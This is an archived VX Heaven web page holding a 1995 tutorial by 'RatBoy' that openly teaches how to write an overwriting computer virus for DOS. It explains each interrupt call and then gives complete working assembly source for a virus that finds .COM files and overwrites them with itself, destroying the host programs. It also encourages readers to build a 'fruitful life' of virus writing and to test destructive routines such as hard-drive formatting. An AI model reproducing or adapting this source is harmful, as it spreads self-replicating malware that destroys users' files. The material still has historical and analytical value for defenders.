<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> RatBoy 'Overwriting virus tutorial #1' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="RatBoy"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, RatBoy,Overwriting virus tutorial #1, code, startvx, file, assembly, virus, star, offset, opened, learn, overwriting, reading, time, close, talk, viruses"/>
<meta name="Description" content="Well here it is my first instructional tutorial. I felt it was nesscary for this file since I could not find any tutorials that taught virus writing from the basic overwriting virus. Well that's how I started and now I want to show you. So that you too can have a long and fruitful life of codeing viruses. :)"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ef4ec3ffa273386c51310feba0ae61a2e5026af7-1498756914-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrb01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Overwriting virus tutorial #1</h1><p><a href="/lib/?lang=en&amp;author=RatBoy"> RatBoy</a><br/> <em><a href="/vx.php?fid=75#f75">Chiba City Blues [3]</a></em><br/> <em>March 1995</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrb01.html';</script><div class="ci"><a href="/lib/?ci=vrb01">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrb01">Back to index</a>] [<a href="/lib/vrb01.html#disqus_thread">Comments</a>]<br/> <pre>
	/\---/\ 
	( . .  )
	\     / WARNING: The information contain within here can be
	 \   / ^^^^^^^ dangerous to you mind and computer!!!!!!!!
	  \*/ I assume no responsiblity!!!!!!!!!
	   #
</pre>
<p>Well here it is my first instructional tutorial. I felt it was nesscary for this file since I could not find any tutorials that taught virus writing from the basic overwriting virus. Well that's how I started and now I want to show you. So that you too can have a long and fruitful life of codeing viruses. :)</p>
<h2>OVERWRITING VIRUSES</h2>
<h3>What is an overwritting virus?</h3>
<p>I'm glad you asked that. :) An overwriting virus is a virus that reproduces by overwriting the first parts of a program with itself. Here is an example:</p>
<pre>
                +-------------------------+        (I got this example from
                |    P R O G R A M        |         40Hex, thanks P/S!!!!)
                +-------------------------+
                         plus:
                +--------+
                | VIRUS! |
                +--------+
                         equals:

                +--------+----------------+
                | VIRUS! | G R A M        |
                +--------+----------------+

</pre>
<p>As you can see the first part of the program was overwritten with the virus code. Since important parts of the original program are effectivly destroyed it won't ever run, but the virus code will. As you can guess overwriting viruses are very destructive and not very productive. But you must learn to walk before you can do the Polka!!</p>
<h3>So what does one need to know to write an overwriting virus?</h3>
<p>Another question I'm glad you asked. :) Well having a basic knowledge in Assembly is a must, but it is not very differcult. As a virus writer, I only know one programing language, Assembly. I didn't even learn BASIC. So don't listen to those that say don't learn Assembly, it's a wonderful programing language. At the end of this file I'll be recomending books and things to do to help ya on your way to Assembly and virus writing.</p>
<p>Well let's get down to codeing!!!! :)</p>
<p>We will be dealing with .Com files. So here is the basic setup for a .Com file in an Assembly source file:</p>
<pre class="source">
-----------------------------------------------------------------------------
        CODE    SEGMENT
        ASSUME  CS:CODE,DS:CODE         ;in .Com files the data, code, extra
                                        ;and stack segments are all the same.
        ORG     100H                    ;this is where all .Com files start
                                        ;in memory.  This allows room for the
                                        ;PSP.
STARTVX PROC    NEAR

        blah!                           ;all your virus body goes here
        blah!
        blah!
STARTVX ENDP
        blah!                           ;all your 'db's go here etc..etc...
CODE    ENDS
        END     STARTVX
-----------------------------------------------------------------------------
</pre>
<p>See the set up isn't really hard to follow, but the lack of info in that example can be confusing. We'll get to a full Virus source code a little later. Now what is the basic setup for a simple overwriting virus? Well let's look at the order of operations:</p>
<ol>
<li>find a file</li>
<li>open the found file</li>
<li>write the virus to the opened file (infect it)</li>
<li>close the file</li>
<li>exit</li>
</ol>
<p>Well as you can see there is nothing but pure replication functions in this setup. Well I wanted it to be easy and not to boog you down with encryption, id bytes, etc... We are dealing with ZEN and the art of basic viruses!</p>
<p>Here we go looking at these steps of an simple overwriting virus:</p>
<h3>(1) FIND FIRST FILE!</h3>
<p>the inputs:</p>
<pre>
	AH: 4EH
	CX: FILE ATTRIBUTES
	DX: OFFSET ADDRESS OF FILE NAME
	DS: SEGMENT ADDRESS OF FILE NAME
</pre>
<p>Now let's see how we would put this into our little program:</p>
<pre class="source">
        mov     ah,4eh                    ;find first service
        mov     cx,0000h                  ;we 0'ed cx for normal files
        mov     dx,offset star_com        ;the file mask for .Com file
                                          ;you'll see
        int     21h
;now of course when you said star_com you need to tell the Assembler what
;you are talking about.  Here it is:

star_com:       db      "*.com",0

;ya see how it will work.  With the use of the wild card '*' the first file
;that has the ending of .com will be found.  This is easy isn't it?
</pre>
<p>Now you can see that we didn't need to touch DS: since CS=DS=ES=SS. So the Star_com already was in the Data Segment. Yay!!!!! Love em .Com files. Sorry need to get back on track.</p>
<p>Now before we can go on and talk about open a found file for writing to(infecting), we must talk about the Disk Transfer Area (DTA). When you find that first file, information about the file found goes into the DTA, everything from file name to date of creation. Here's the setup:</p>
<pre class="source">
	0h	db	21 dup(0)	;reserved for DOS uses
	15h	db	00		;file attributes
	16h	dw	0000		;file time
	18h	dw	0000		;file date
	1ah	dd	00000000	;file size
	1eh	db	13 dup(0)	;asciiz of the file name.
</pre>
<p>That is the layout of the DTA. Now the DTA lies in the PSP. The first 256 (100h) bytes infront of the .Com file. It's address is 80h. Most of the time in virus writing, you would want to move the DTA to a location where you can manipulate it without possbile messing up the PSP. Well for our case, with a simple overwriting virus, we don't need to worry. All we are going to do is read from the DTA, the file name we just have found. Now this is how we will address the file name, now we know that the DTA starts at 80h, and we know that at 1eh from the DTA's begining is the asciiz of the file name. So we just add them together and see what we get, 80h + 1eh = 9eh. Well that is were it's located, now let's move on to the next step.</p>
<h3>(2) OPENING THE FOUND FILE!</h3>
<pre>
the inputs:
	AH: 3DH
	AL: 00H ;opened for reading only
	    01H ;opened for writing only
	    02H ;opened for both reading and writing
	DX: OFFSET ADDRESS OF THE FILE NAME
	DS: SEGMENT ADDRESS OF THE FILE NAME
outputs:
	AX: FILE HANDLE
</pre>
<p>Now look at it setup in the format we need to know.</p>
<pre class="source">
	mov	ah,3dh	;open file
	mov	al,02h	;open it for reading and writing
	mov	dx,9eh	;remember this is where the name in the DTA
	int	21h
</pre>
<p>Now Dos services will return a file handle of the file we just opened. The file handle is nothing more than a number that dos uses to know where it will read from(the file) or write to(the file). We don't want it in AX since the next step that you will see we need it in BX. Here's a easy way to move it:</p>
<pre class="source">
	xchg	bx,ax	;that will put the file handle into bx in one
			;step!!!
</pre>
<p>Ok now the down and dirty stuff. Infecting the file we just opened. Ha ha!</p>
<h3>(3)WRITING TO THE OPENED FILE(INFECTING)</h3>
<pre>
the inputs:
	AH: 40H
	BX: FILE HANDLE
	CX: BYTES TO WRITE
	DX: OFFSET OF ADDRESS OF THE BEGINING OF THE VIRUS
</pre>
<p>Here we go again with seeing what it will look like:</p>
<pre class="source">
	mov	ah,40h
	mov	cx,offset endvx - offset startvx;this will find the virus
						;lenth, how many bytes to
						;write....
	mov	dx,offset startvx		;where the virus starts
	int	21h
</pre>
<p>Ahhhhhhhhh! I always feel so relaxed after reproducing....ahh.hh...h! Oh...where was I, a...well now that we have copied the virus to the file, now we can close it up.</p>
<h3>(4)CLOSE THE FILE! ;Whata-ya live in a barn!</h3>
<pre>
the inputs:
	AX: 3EH
	BX: FILE HANDLE
</pre>
<p>Now before we go on remember how after we opened the file that we put the file handle in BX. So since we didn't mess with BX we should just have to:</p>
<pre class="source">
	mov	ah,3eh
	int	21h
</pre>
<p>Now for the final and last step the exiting. Here ya go:</p>
<h3>(5)EXIT!</h3>
<p>int 20h</p>
<p>Well I know it isn't really pretty, but it works. Well let's look at how all of it fits together:</p>
<pre class="source">
-----------------------------------------------------------------------------
Code    Segment
        Assume CS:code,DS:code
        Org     100h

startvx proc    near

        mov     ah,4eh
        mov     cx,0000h
        mov     dx,offset star_com
        int     21h

        mov     ah,3dh
        mov     al,02h
        mov     dx,9eh
        int     21h

        xchg    bx,ax

        mov     ah,40h
        mov     cx,offset endvx - offset startvx
        mov     dx,offset startvx
        int     21h

        mov     ah,3eh
        int     21h

        int     20h

startvx endp

star_com:       db      "*.com",0

endvx   label   near

code    ends
        end     startvx

-----------------------------------------------------------------------------
</pre>
<p>Sorry I didn't put comments in, but that was done so that if you can not read along and follow what is going on. You need to re-read this file, and practice more Assembly.</p>
<h3>Now that I know overwriting virus programing what can I use them for?</h3>
<p>Another fine question. :) overwriting viruses are simple, and being simple they are fairly easy to follow and program. That in it's self will help educate you in the basics of a virus, writing, reading, find file, etc.... Also since it's fairly easy to write up an overwriting virus you can use them as test platforms for other routines. Formating HD's, visual displays, encryption, etc..... This is so that you can concentrate on the how the test routine will work not the virus.</p>
<h3>Now that I have the basics, is that all I need?</h3>
<p>OH No, there are many things that you need, the knowledge being the hardest. Read Assembler Inside and Out, and Using Assembly, they're really good books. You need, an Assembler(A86+TASM), lot's of source codes to learn from(some included). It just dosen't stop there, you will need a some really good virus scanners to track what your virus is doing. F-prot and Tbav are great, but if you come up with a virus that is unscannerable they won't work. That's why I highly recommend INVIRCIBLE. It will protect you from real screw ups, track your virus movement, even unscannibles, even protect you from your 'friends' viruses on you computer >:>. It's the best anti-virus protection out there, you need to know your enemy, and it's a powerful tool. The biggest and most important thing you can have is people that are helpful enough to take the time to answer the questions that form in your mind. You will see some of those people in the closing credits of this file. Talk to them.</p>
<p>Now you are on to a long and fruitful life of making your own viruses. Remember pratice, ask questions, read and of course have fun!!!!!!!</p>
<p>Now I would like to take the time to thank a few people:</p>
<ul>
<li>God, for making me possible</li>
<li>My Wife, for putting up with me!!</li>
<li>FC, thanks for all the info and help, dude!!!</li>
<li>Invircible, yea I know it's a piece of software, but it has covered my but enough times. Thanks Mike!!!!!!!!!!!!!!!!!</li>
<li>Aristotle, yea Aristotle, the dude help start me out.</li>
<li>Vlad, Immortal Riot, NuKE, Falcon, P/S, Mad Arab, Terminal Velocity..etc..</li>
</ul>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vrb01">Back to index</a>] [<a href="/lib/vrb01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrb01">de</a><a href="/lib/index.php?lang=en&amp;id=vrb01">en</a><a href="/lib/index.php?lang=es&amp;id=vrb01">es</a><a href="/lib/index.php?lang=it&amp;id=vrb01">it</a><a href="/lib/index.php?lang=fr&amp;id=vrb01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrb01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrb01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrb01">ua</a></div>
</body>
</html>
